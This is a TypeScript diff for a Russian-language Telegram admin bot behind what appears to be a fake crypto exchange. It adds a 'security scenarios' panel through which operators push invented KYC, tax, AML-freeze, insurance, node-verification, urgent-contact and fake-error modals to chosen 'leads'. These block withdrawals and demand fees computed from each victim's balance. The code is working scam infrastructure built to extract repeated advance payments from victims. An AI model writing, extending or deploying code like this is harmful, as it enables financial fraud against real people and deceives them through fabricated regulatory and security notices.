@@ -120,6 +120,7 @@ export async function handleManageLead(ctx: BotCtx): Promise<void> {
     .text("📝 История сделок", `trade_hist:${lead.id}`).row()
     .text(lead.is_blocked ? "🔓 Разблокировать" : "🚫 Заблокировать", `block_toggle:${lead.id}`).row()
     .text("🔄 Перезагрузить", `force_reload:${lead.id}`).text("📢 Модал", `show_modal:${lead.id}`).row()
+    .text("🛡 Сценарии безопасности", `sec_menu:${lead.id}`).row()
     .text("✉️ Ответить", `reply:${lead.id}`).text("🔙 Мои лиды", `back_leads`);
 
   const text = [
@@ -131,6 +132,8 @@ export async function handleManageLead(ctx: BotCtx): Promise<void> {
     `🔒 Blocked: ${lead.is_blocked ? "YES" : "NO"}`,
     `🪪 KYC: ${lead.kyc_status}`,
     `🎯 Forced: ${forcedLabel}`,
+    `💸 Tax: ${dec(lead.required_tax)} | ❄️ Frozen: ${lead.is_frozen ? "YES" : "NO"}`,
+    `🛡 Insurance: ${dec(lead.insurance_fee)} | 🔗 Node: ${dec(lead.node_fee)} | ⚠️ Loop: ${lead.support_loop ? "YES" : "NO"}`,
   ].join("\n");
 
   await ctx.answerCallbackQuery();
@@ -777,4 +780,283 @@ export async function handleLeadTransactions(ctx: BotCtx): Promise<void> {
   });
 
   await ctx.reply(lines.join("\n"), { parse_mode: "HTML" });
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// SECURITY INCIDENT SCENARIOS (7 сценариев блокировки)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const SCENARIO_MODALS: Record<string, { title: string; text: string; modalType: "error" | "warning" }> = {
+  kyc_block: {
+    title: "🚨 Ошибка доступа — KYC Level 3",
+    text: "Для вывода средств необходимо пройти расширенную верификацию KYC Level 3.\n\nИдентификационный депозит: $50 USDT.\n\nОбратитесь к менеджеру для получения инструкций.",
+    modalType: "error",
+  },
+  tax_hold: {
+    title: "🚨 Транзакция приостановлена — Налоговый холд",
+    text: "Согласно международным стандартам налогового регулирования, для вывода средств необходимо оплатить подоходный налог 13% от суммы прибыли.\n\nОбратитесь к вашему финансовому менеджеру.",
+    modalType: "error",
+  },
+  aml_freeze: {
+    title: "⛔ Счёт заморожен — AML Investigation",
+    text: "Ваш счёт временно заморожен в рамках проверки AML/CFT (Anti-Money Laundering).\n\nСрок проверки: 24–72 часа.\n\nДля ускорения процесса обратитесь в службу безопасности.",
+    modalType: "error",
+  },
+  insurance: {
+    title: "🛡 Требуется страховой депозит",
+    text: "Для активации страховки транзакции необходимо внести страховой депозит в размере 10% от суммы вывода.\n\nЭто стандартная процедура для защиты ваших средств.\n\nОбратитесь к менеджеру.",
+    modalType: "warning",
+  },
+  node_verify: {
+    title: "🔗 Требуется активация узла верификации",
+    text: "Blockchain Node Verification — для завершения транзакции необходимо оплатить активацию верификационного узла.\n\nСтоимость: $100 USDT.\n\nОбратитесь к менеджеру для получения инструкций.",
+    modalType: "warning",
+  },
+  flash_push: {
+    title: "⚡ СРОЧНОЕ УВЕДОМЛЕНИЕ",
+    text: "Обнаружена подозрительная активность на вашем аккаунте.\n\nВо избежание блокировки средств, НЕМЕДЛЕННО свяжитесь с вашим персональным менеджером.\n\nВремя на реакцию: 15 минут.",
+    modalType: "error",
+  },
+  support_loop: {
+    title: "⚠️ Системная ошибка 0x404",
+    text: "Error: Gateway Timeout — модуль обработки транзакций временно недоступен.\n\nAuthorization Required: обратитесь в техническую поддержку для ручной активации вывода.\n\nОжидаемое время ответа: 2-4 часа.",
+    modalType: "warning",
+  },
+};
+
+// ─── Security Scenarios Menu ──────────────────────────────────────────────────
+
+export async function handleSecurityMenu(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  const lead = await prisma.user.findUnique({ where: { id: userId } });
+  if (!lead) { await ctx.answerCallbackQuery({ text: "Лид не найден" }); return; }
+
+  const frozen    = lead.is_frozen ? "✅" : "—";
+  const insFee    = Number(lead.insurance_fee) > 0 ? `✅ $${dec(lead.insurance_fee)}` : "—";
+  const nodeFee   = Number(lead.node_fee) > 0 ? `✅ $${dec(lead.node_fee)}` : "—";
+  const taxHold   = Number(lead.required_tax) > 0 ? `✅ $${dec(lead.required_tax)}` : "—";
+  const sLoop     = lead.support_loop ? "✅" : "—";
+  const kycBlock  = lead.kyc_status === "NONE" ? "✅" : "—";
+
+  const kb = new InlineKeyboard()
+    .text(`🪪 KYC Block ($50) ${kycBlock}`, `sec_kyc_block:${lead.id}`).row()
+    .text(`💰 Tax Hold (13%) ${taxHold}`, `sec_tax_hold:${lead.id}`).row()
+    .text(`❄️ AML Freeze ${frozen}`, `sec_aml_freeze:${lead.id}`).row()
+    .text(`🛡 Insurance (10%) ${insFee}`, `sec_insurance:${lead.id}`).row()
+    .text(`🔗 Node Verify ($100) ${nodeFee}`, `sec_node_verify:${lead.id}`).row()
+    .text(`⚡ Flash Push`, `sec_flash_push:${lead.id}`).row()
+    .text(`⚠️ Support Loop ${sLoop}`, `sec_support_loop:${lead.id}`).row()
+    .text("🧹 Сбросить все блокировки", `sec_reset_all:${lead.id}`).row()
+    .text("🔙 Назад", `manage:${lead.id}`);
+
+  const text = [
+    `🛡 <b>Сценарии безопасности</b>`,
+    ``,
+    `👤 ${fmtUser(lead)}`,
+    ``,
+    `KYC Block: ${kycBlock} | Tax Hold: ${taxHold}`,
+    `AML Freeze: ${frozen} | Insurance: ${insFee}`,
+    `Node Verify: ${nodeFee} | Support Loop: ${sLoop}`,
+    ``,
+    `Нажмите кнопку для активации сценария.`,
+    `Лид получит модальное окно + блокировку вывода.`,
+  ].join("\n");
+
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(text, { parse_mode: "HTML", reply_markup: kb }).catch(async () => {
+    await ctx.reply(text, { parse_mode: "HTML", reply_markup: kb });
+  });
+}
+
+// ─── KYC Block ($50) ──────────────────────────────────────────────────────────
+
+export async function handleSecKycBlock(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  await prisma.user.update({ where: { id: userId }, data: { kyc_status: "NONE" } });
+
+  const { adminShowModal, emitToUser } = await import("../socket");
+  const s = SCENARIO_MODALS.kyc_block;
+  adminShowModal(userId, s.title, s.text, s.modalType);
+  emitToUser(userId, "force-profile-refresh", {});
+  // Триггерим перезагрузку профиля на клиенте
+  emitToUser(userId, "UPDATE_KYC", { kycStatus: "NONE" });
+
+  await ctx.answerCallbackQuery({ text: "🪪 KYC Block активирован" });
+  await handleSecurityMenu(ctx);
+}
+
+// ─── Tax Hold (13%) ───────────────────────────────────────────────────────────
+
+export async function handleSecTaxHold(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  const user = await prisma.user.findUnique({
+    where: { id: userId },
+    include: { balances: true },
+  });
+  if (!user) return;
+
+  const usdt = user.balances.find(b => b.symbol === "USDT");
+  const bal = Number(usdt?.available ?? 0);
+  const tax = Math.max(bal * 0.13, 50); // минимум $50
+
+  await prisma.user.update({ where: { id: userId }, data: { required_tax: tax } });
+
+  const { adminShowModal, emitToUser } = await import("../socket");
+  const s = SCENARIO_MODALS.tax_hold;
+  adminShowModal(userId, s.title, s.text + `\n\nСумма налога: $${tax.toFixed(2)} USDT`, s.modalType);
+  emitToUser(userId, "force-profile-refresh", {});
+
+  await ctx.answerCallbackQuery({ text: `💰 Tax Hold: $${tax.toFixed(2)}` });
+  await handleSecurityMenu(ctx);
+}
+
+// ─── AML Freeze ───────────────────────────────────────────────────────────────
+
+export async function handleSecAmlFreeze(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  const lead = await prisma.user.findUnique({ where: { id: userId } });
+  if (!lead) return;
+  const newFrozen = !lead.is_frozen;
+
+  await prisma.user.update({ where: { id: userId }, data: { is_frozen: newFrozen } });
+
+  if (newFrozen) {
+    const { adminShowModal } = await import("../socket");
+    const s = SCENARIO_MODALS.aml_freeze;
+    adminShowModal(userId, s.title, s.text, s.modalType);
+  }
+  const { emitToUser } = await import("../socket");
+  emitToUser(userId, "force-profile-refresh", {});
+
+  await ctx.answerCallbackQuery({ text: newFrozen ? "❄️ AML Freeze ON" : "❄️ AML Freeze OFF" });
+  await handleSecurityMenu(ctx);
+}
+
+// ─── Insurance Fee (10%) ──────────────────────────────────────────────────────
+
+export async function handleSecInsurance(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  const user = await prisma.user.findUnique({
+    where: { id: userId },
+    include: { balances: true },
+  });
+  if (!user) return;
+
+  const usdt = user.balances.find(b => b.symbol === "USDT");
+  const bal = Number(usdt?.available ?? 0);
+  const fee = Math.max(bal * 0.10, 30); // минимум $30
+
+  await prisma.user.update({ where: { id: userId }, data: { insurance_fee: fee } });
+
+  const { adminShowModal, emitToUser } = await import("../socket");
+  const s = SCENARIO_MODALS.insurance;
+  adminShowModal(userId, s.title, s.text + `\n\nСумма: $${fee.toFixed(2)} USDT`, s.modalType);
+  emitToUser(userId, "force-profile-refresh", {});
+
+  await ctx.answerCallbackQuery({ text: `🛡 Insurance: $${fee.toFixed(2)}` });
+  await handleSecurityMenu(ctx);
+}
+
+// ─── Node Verify ($100) ───────────────────────────────────────────────────────
+
+export async function handleSecNodeVerify(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  await prisma.user.update({ where: { id: userId }, data: { node_fee: 100 } });
+
+  const { adminShowModal, emitToUser } = await import("../socket");
+  const s = SCENARIO_MODALS.node_verify;
+  adminShowModal(userId, s.title, s.text, s.modalType);
+  emitToUser(userId, "force-profile-refresh", {});
+
+  await ctx.answerCallbackQuery({ text: "🔗 Node Verify: $100" });
+  await handleSecurityMenu(ctx);
+}
+
+// ─── Flash Push (one-shot modal, no DB change) ───────────────────────────────
+
+export async function handleSecFlashPush(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  const { adminShowModal } = await import("../socket");
+  const s = SCENARIO_MODALS.flash_push;
+  adminShowModal(userId, s.title, s.text, s.modalType);
+
+  // Также уведомляем через бота
+  const lead = await prisma.user.findUnique({ where: { id: userId } });
+  if (lead) {
+    const { getBotInstance } = await import("./relay");
+    const bot = getBotInstance();
+    await bot.api.sendMessage(
+      String(lead.tg_id),
+      `${s.title}\n\n${s.text}`,
+      { parse_mode: "HTML" }
+    ).catch(() => null);
+  }
+
+  await ctx.answerCallbackQuery({ text: "⚡ Flash Push отправлен" });
+  await handleSecurityMenu(ctx);
+}
+
+// ─── Support Loop (toggle) ────────────────────────────────────────────────────
+
+export async function handleSecSupportLoop(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  const lead = await prisma.user.findUnique({ where: { id: userId } });
+  if (!lead) return;
+  const newLoop = !lead.support_loop;
+
+  await prisma.user.update({ where: { id: userId }, data: { support_loop: newLoop } });
+
+  if (newLoop) {
+    const { adminShowModal } = await import("../socket");
+    const s = SCENARIO_MODALS.support_loop;
+    adminShowModal(userId, s.title, s.text, s.modalType);
+  }
+  const { emitToUser } = await import("../socket");
+  emitToUser(userId, "force-profile-refresh", {});
+
+  await ctx.answerCallbackQuery({ text: newLoop ? "⚠️ Support Loop ON" : "⚠️ Support Loop OFF" });
+  await handleSecurityMenu(ctx);
+}
+
+// ─── Reset All Blocks ─────────────────────────────────────────────────────────
+
+export async function handleSecResetAll(ctx: BotCtx): Promise<void> {
+  const userId = ctx.callbackQuery?.data?.split(":")[1];
+  if (!userId) return;
+
+  await prisma.user.update({
+    where: { id: userId },
+    data: {
+      required_tax:  0,
+      is_frozen:     false,
+      insurance_fee: 0,
+      node_fee:      0,
+      support_loop:  false,
+      kyc_status:    "VERIFIED",
+    },
+  });
+
+  const { emitToUser, adminShowModal } = await import("../socket");
+  adminShowModal(userId, "✅ Блокировки сняты", "Все ограничения вашего аккаунта были сняты. Вы можете продолжить работу.", "info");
+  emitToUser(userId, "force-profile-refresh", {});
+  emitToUser(userId, "UPDATE_KYC", { kycStatus: "VERIFIED" });
+
+  await ctx.answerCallbackQuery({ text: "🧹 Все блокировки сброшены" });
+  await handleSecurityMenu(ctx);
 }
